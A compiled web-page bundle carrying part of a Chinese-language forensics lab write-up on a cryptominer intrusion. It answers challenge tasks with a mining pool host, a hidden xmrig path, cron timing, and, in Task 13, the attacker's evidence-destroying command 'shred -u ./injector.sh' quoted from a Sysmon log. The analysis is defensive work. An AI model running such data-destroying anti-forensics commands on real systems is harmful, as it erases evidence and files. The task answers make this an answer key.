#033[0m#033[1;31mdisabled#033[0m#033[0m\n'})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"monero.herominers.com\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-12",children:"Task 12"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u6211\u4eec\u65e0\u6cd5\u5728\u539f\u59cb\u4e0b\u8f7d\u4f4d\u7f6e\u627e\u5230\u52a0\u5bc6\u6316\u77ff\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u914d\u7f6e\u6587\u4ef6\u3002TA \u5c06\u5b83\u4eec\u79fb\u52a8\u5230\u6587\u4ef6\u7cfb\u7edf\u7684\u54ea\u4e2a\u4f4d\u7f6e\uff1f"}),"\n"]}),"\n",(0,n.jsx)(a.p,{children:"Task 10 \u5c31\u6709"}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="ip-172-31-13-147-20221124-1501-process-exe-links.txt"',children:"lrwxrwxrwx 1 root             root             0 Nov 24 14:46 /proc/1089/exe -> /usr/share/.logstxt/xmrig\n"})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"/usr/share/.logstxt/xmrig\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-13",children:"Task 13"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u6211\u4eec\u65e0\u6cd5\u8fdb\u884c\u53d6\u8bc1\u5730\u6062\u590d\u7528\u4e8e\u5206\u6790\u7684 \u201cinjector.sh\u201d \u811a\u672c\u3002\u6211\u4eec\u8ba4\u4e3a TA \u53ef\u80fd\u8fd0\u884c\u4e86\u4e00\u4e2a\u547d\u4ee4\uff0c\u963b\u6b62\u6211\u4eec\u6062\u590d\u8be5\u6587\u4ef6\u3002TA \u8fd0\u884c\u4e86\u54ea\u4e2a\u547d\u4ee4\uff1f"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u7ee7\u7eed\u67e5\u770b ",(0,n.jsx)(a.code,{children:"syslog"})]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",children:'Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.343163000Z"/><EventRecordID>77196</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.344</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-505f-8d8aca550000}</Data><Data Name="ProcessId">4091</Data><Data Name="Image">/usr/bin/shred</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">shred -u ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>\n'})}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"shred -u ./injector.sh\n"})}),"\n",(0,n.jsx)(a.h2,{id:"task-14",children:"Task 14"}),"\n",(0,n.jsxs)(a.blockquote,{children:["\n",(0,n.jsx)(a.p,{children:"\u7531\u6211\u4eec\u7684 IT \u7ba1\u7406\u5458\u521b\u5efa\u7684 cronjob \u4e3a TA \u4fee\u6539\u7684\u811a\u672c\u8fd0\u884c\u591a\u9891\u7e41\uff1f"}),"\n"]}),"\n",(0,n.jsxs)(a.p,{children:["\u5206\u6790 ",(0,n.jsx)(a.code,{children:"syslog"})," \u65e5\u5fd7\u6587\u4ef6\uff0c\u5b9a\u4f4d\u6bcf\u5929\u7684\u56fa\u5b9a\u65f6\u95f4\u7684\u76f8\u540c\u8bb0\u5f55\u5373\u53ef"]}),"\n",(0,n.jsx)(a.pre,{children:(0,n.jsx)(a.code,{className:"language-plaintext",metastring:'title="Answer"',children:"daily - 08:30\n"})})]})}function c(e={}){const{wrapper:a}={...(0,r.a)(),...e.components};return a?(0,n.jsx)(a,{...e,children:(0,n.jsx)(l,{...e})}):l(e)}},59146:(e,a,t)=>{t.d(a,{Z:()=>n});const n=t.p+"assets/files/ore-9fcda3ca8f273e1639dc8acb820c724a.zip"},11151:(e,a,t)=>{t.d(a,{Z:()=>i,a:()=>o});var n=t(67294);const r={},s=n.createContext(r);function o(e){const a=n.useContext(s);return n.useMemo((function(){return"function"==typeof e?e(a):{...a,...e}}),[a,e])}function i(e){let a;return a=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),n.createElement(s.Provider,{value:a},e.children)}}}]);